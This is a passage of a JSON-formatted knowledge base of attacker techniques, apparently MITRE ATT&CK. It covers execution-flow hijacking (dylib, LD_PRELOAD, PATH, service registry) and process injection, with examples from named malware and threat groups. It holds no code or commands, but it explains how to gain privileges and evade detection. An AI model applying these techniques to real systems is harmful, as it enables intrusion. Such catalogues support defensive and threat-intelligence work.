lssas.exe service."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT has used DLL side-loading to load malicious payloads."}]}, {"name": "Dylib Hijacking", "description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.", "detailed_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1574.004", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application."}]}, {"name": "Executable Installer File Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.  If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.", "id": "T1574.005", "examples": []}, {"name": "Dynamic Linker Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s os.environ.\nOn Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file. Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen() and mmap() respectively.\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the DYLD_INSERT_LIBRARIES environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.", "id": "T1574.006", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 has configured payloads to load via LD_PRELOAD."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda modified the ld.so preload file in Linux environments to enable persistence for Winnti malware."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER copies the malicious file /data2/.bd.key/preload.so to /lib/preload.so, then launches a child process that executes the malicious file /data2/.bd.key/authd as /bin/authd with the arguments /lib/preload.so reboot newreboot 1. This injects the malicious preload.so file into the process with PID 1, and replaces its reboot function with the malicious newreboot function for persistence."}, {"id": "S0377", "name": "Ebury", "description": "When Ebury is running as an OpenSSH server, it uses LD_PRELOAD to inject its malicious shared module in to programs launched by SSH sessions. Ebury hooks the following functions from libc to inject into subprocesses;  system, popen, execve, execvpe, execv, execvp, and execl."}, {"id": "S0394", "name": "HiddenWasp", "description": "HiddenWasp adds itself as a shared object to the LD_PRELOAD environment variable."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has modified /etc/ld.so.preload to intercept shared library import functions."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET adds malicious file paths to the DYLD_FRAMEWORK_PATH and DYLD_LIBRARY_PATH environment variables to execute malicious code."}]}, {"name": "Path Interception by PATH Environment Variable", "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in C:\\example path, which by default precedes C:\\Windows\\system32\\net.exe in the PATH environment variable, when \"net\" is executed from the command-line the C:\\example path will be called instead of the system's legitimate executable at C:\\Windows\\system32\\net.exe. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a Command and Scripting Interpreter.\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the $PATH variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, Unix Shell Configuration Modification, or modifying the /etc/paths.d folder contents.", "id": "T1574.007", "examples": [{"id": "S1111", "name": "DarkGate", "description": "DarkGate overrides the %windir% environment variable by setting a Registry key, HKEY_CURRENT_User\\Environment\\windir, to an alternate command to execute a malicious AutoIt script. This allows DarkGate to run every time the scheduled task DiskCleanup is executed as this uses the path value %windir%\\system32\\cleanmgr.exe for execution."}, {"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit path interception opportunities in the PATH environment variable."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable."}]}, {"name": "Path Interception by Search Order Hijacking", "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument net user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then cmd.exe /C net user will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.", "id": "T1574.008", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit search order hijacking vulnerabilities."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities."}]}, {"name": "Path Interception by Unquoted Path", "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\nService paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\\unsafe path with space\\program.exe vs. \"C:\\safe path with space\\program.exe\").  (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\\program files\\myapp.exe, an adversary may create a program at C:\\program.exe that will be run instead of the intended program.\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.", "id": "T1574.009", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire contains modules that can discover and exploit unquoted path vulnerabilities."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities."}]}, {"name": "Services File Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.", "id": "T1574.010", "examples": [{"id": "S0089", "name": "BlackEnergy", "description": "One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence."}]}, {"name": "Services Registry Permissions Weakness", "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. ", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. \nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.\nThe Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the Performance key is not already present and if an adversary-controlled user has the Create Subkey permission, adversaries may create the Performance key in the service\u2019s Registry tree to point to a malicious DLL.\nAdversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.", "id": "T1574.011", "examples": [{"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the svchost.exe process."}]}, {"name": "COR_PROFILER", "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.", "detailed_description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.", "id": "T1574.012", "examples": [{"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active."}]}, {"name": "KernelCallbackTable", "description": "Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.", "detailed_description": "Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.\nAn adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.\nA pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function). Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload. Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.", "id": "T1574.013", "examples": [{"id": "S0182", "name": "FinFisher", "description": "FinFisher has used the KernelCallbackTable to hijack the execution flow of a process by replacing the __fnDWORD function with the address of a created Asynchronous Procedure Call stub routine."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode."}]}, {"name": "AppDomainManager", "description": "Adversaries may execute their own malicious payloads by hijacking how the .NET AppDomainManager loads assemblies. The .NET framework uses the AppDomainManager class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exe or .dll binaries compiled to run as .NET code) may be loaded into an application domain as executable code.", "detailed_description": "Adversaries may execute their own malicious payloads by hijacking how the .NET AppDomainManager loads assemblies. The .NET framework uses the AppDomainManager class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exe or .dll binaries compiled to run as .NET code) may be loaded into an application domain as executable code.\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (.config) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.", "id": "T1574.014", "examples": [{"id": "S1152", "name": "IMAPLoader", "description": "IMAPLoader is executed via the AppDomainManager injection technique."}]}]}, {"name": "Process Injection", "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.", "detailed_description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.", "id": "T1055", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. "}, {"id": "S0469", "name": "ABK", "description": "ABK has the ability to inject shellcode into svchost.exe."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can inject into known, vulnerable binaries on targeted hosts."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA can inject into the wuauclt.exe process to perform C2 actions."}, {"id": "G0050", "name": "APT32", "description": "APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe."}, {"id": "G0067", "name": "APT37", "description": "APT37 injects its malware variant, ROKRAT, into the cmd.exe process."}, {"id": "G0096", "name": "APT41", "description": "APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection."}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred can inject code from files to other running processes."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to inject shellcode into svchost.exe."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea injects itself into explorer.exe."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can inject itself into an existing explorer.exe process by using RtlCreateUserThread."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can inject code through calling VirtualAllocExNuma."}, {"id": "S0470", "name": "BBK", "description": "BBK has the ability to inject shellcode into svchost.exe."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can inject code into multiple processes on infected endpoints."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT injects into a newly spawned process created from a native Windows executable."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can inject into the svchost.exe process for execution."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER includes a binary labeled authd that can inject a library into a running process and then hook an existing function within that process with a new function from that library."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has injected code into trusted processes."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary."}, {"id": "S0614", "name": "CostaBricks", "description": "CostaBricks can inject a payload into the memory of a compromised host."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used malicious SparkGateway plugins to inject shared objects into web process memory on compromised Ivanti Secure Connect VPNs to enable deployment of backdoors."}, {"id": "S0695", "name": "Donut", "description": "Donut includes a subproject DonutTest to inject shellcode into a target process."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP compromises the .text section of a legitimate system DLL in %windir% to hold the contents of retrieved plug-ins."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to directly inject its code into the web browser process."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can inject its payload into iexplore.exe process."}, {"id": "S0363", "name": "Empire", "description": "Empire contains multiple modules for injecting into processes, such as Invoke-PSInject."}, {"id": "S0168", "name": "Gazer", "description": "Gazer injects its communication module into an Internet accessible process through which it performs C2."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT can inject malicious code into process created by the \"Command_Create&Inject\" function."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state. GuLoader has previously used RegAsm as a donor process."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has injected into running processes."}, {"id": "S0040", "name": "HTRAN", "description": "HTRAN can inject into into running processes."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro can run shellcode it injects into a newly created process."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure."}, {"id": "S0581", "name": "IronNetInjector", "description": "IronNetInjector can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT performs code injection injecting its own functions to browser processes."}, {"id": "S0201", "name": "JPIN", "description": "JPIN can inject content into lsass.exe to load a module."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used Win7Elevate to inject malicious code into explorer.exe."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can migrate the loader into another process."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can inject the loader file, Speech02.db, into a process."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has been injected directly into a running process, including explorer.exe."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu's binary is injected into memory via WriteProcessMemory."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT copies itself into a running Internet Explorer process to evade detection."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe."}, {"id": "S1100", "name": "Ninja", "description": "Ninja has the ability to inject an agent module into a new process and arbitrary shellcode into running processes."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors injected code into a selected process, which in turn launches a command as a child process of the original."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can start and inject code into a new svchost process."}, {"id": "S1050", "name": "PcShare", "description": "The PcShare payload has been injected into the logagent.exe and rdpclip.exe processes."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has used various methods of process injection including hot patching."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains multiple modules for injecting into processes, such as Invoke-PSInject."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe."}, {"id": "S0332", "name": "Remcos", "description": "Remcos has a command to hide itself through injecting into another process."}, {"id": "S0496", "name": "REvil", "description": "REvil can inject itself into running processes on a compromised host."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can use VirtualAlloc, WriteProcessMemory, and then CreateRemoteThread to execute shellcode within the address space of Notepad.exe."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has injected an install module into a newly created process."}, {"id": "G0091", "name": "Silence", "description": "Silence has injected a DLL library containing a Trojan into the fwmain32.exe process."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can inject shellcode directly into Excel.exe or a specific process."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can inject code into local and remote processes."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA can inject into running processes on a compromised host."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader injects into the Internet Explorer process."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has used Nt* Native API functions to inject code into legitimate processes such as wermgr.exe."}, {"id": "S0436", "name": "TSCookie", "description": "TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes."}, {"id": "G0010", "name": "Turla", "description": "Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the ability to inject malicious DLLs into a specific process for privilege escalation."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can inject decrypted shellcode into the LanmanServer service."}, {"id": "S0206", "name": "Wiarp", "description": "Wiarp creates a backdoor through which remote attackers can inject files into running processes."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird performs multiple process injections to hijack system processes and execute malicious code."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used process injection to execute payloads to escalate privileges."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread."}], "sub_techniques": [{"name": "Dynamic-link Library Injection", "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.", "detailed_description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL).\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary).\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's AddressOfEntryPoint before starting a new thread in the target process. This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.", "id": "T1055.001", "examples": [{"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to inject itself into another process such as rundll32.exe and dllhost.exe."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has dropped legitimate software onto a compromised host and used it to execute malicious DLLs."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH has the ability to execute a malicious DLL by injecting into explorer.exe on a compromised machine."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy injects its DLL component into svchost.exe."}, {"id": "S1039", "name": "Bumblebee", "description": "The Bumblebee loader can support the Dij command which gives it the ability to inject DLLs into the memory of other processes."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used a DLL named D8B3.dll that was injected into the Winlogon process."}, {"id": "S0484", "name": "Carberp", "description": "Carberp's bootkit can inject a malicious DLL into the address space of running processes."}, {"id": "S0335", "name": "Carbon", "description": "Carbon has a command to inject code into a process."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike has the ability to load DLLs via reflective injection."}, {"id": "S0126", "name": "ComRAT", 